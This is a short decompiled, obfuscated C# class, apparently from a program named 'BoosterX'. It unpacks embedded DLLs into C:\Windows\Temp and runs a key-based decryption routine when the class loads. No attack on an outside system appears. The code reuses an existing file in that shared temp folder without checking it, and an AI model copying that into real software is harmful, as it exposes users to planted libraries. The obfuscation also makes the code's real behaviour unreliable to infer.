using System;
using System.IO;

// Token: 0x02000544 RID: 1348
internal sealed class Class644
{
	// Token: 0x06002208 RID: 8712 RVA: 0x000164FB File Offset: 0x000146FB
	// Note: this type is marked as 'beforefieldinit'.
	static Class644()
	{
		Class644.smethod_1(ref Class644.struct9_0);
	}

	// Token: 0x06002209 RID: 8713 RVA: 0x00088470 File Offset: 0x00086670
	public static string smethod_0(string string_0)
	{
		if (File.Exists("C:\\Windows\\Temp\\" + string_0))
		{
			return "C:\\Windows\\Temp\\" + string_0;
		}
		Class765.smethod_4("BoosterX", "C:\\Windows\\Temp\\", "Resources.EmbedRes.Dlls", string_0, false);
		return "C:\\Windows\\Temp\\" + string_0;
	}

	// Token: 0x0600220A RID: 8714 RVA: 0x000884C4 File Offset: 0x000866C4
	private static void smethod_1(ref Struct9 struct9_1)
	{
		object[] array = new object[]
		{
			struct9_1
		};
		Class31 @class = Class392.smethod_3();
		Stream stream_ = Class392.smethod_1();
		try
		{
			@class.method_64(stream_, "R'a9.Za-jJ", array);
		}
		finally
		{
			struct9_1 = (Struct9)array[0];
		}
	}

	// Token: 0x040016B1 RID: 5809
	public static readonly Struct9 struct9_0;
}
